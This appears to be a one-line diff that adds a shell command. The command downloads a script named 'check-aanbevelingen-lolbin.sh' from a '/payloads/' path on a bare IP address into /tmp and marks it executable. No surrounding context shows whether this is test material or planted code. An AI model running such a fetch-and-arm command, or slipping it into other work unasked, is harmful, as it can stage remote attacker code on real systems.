@@ -1,0 +1,1 @@
+curl -o /tmp/check-aanbevelingen-lolbin.sh http://10.0.0.1/payloads/check-aanbevelingen-lolbin.sh && chmod +x /tmp/check-aanbevelingen-lolbin.sh
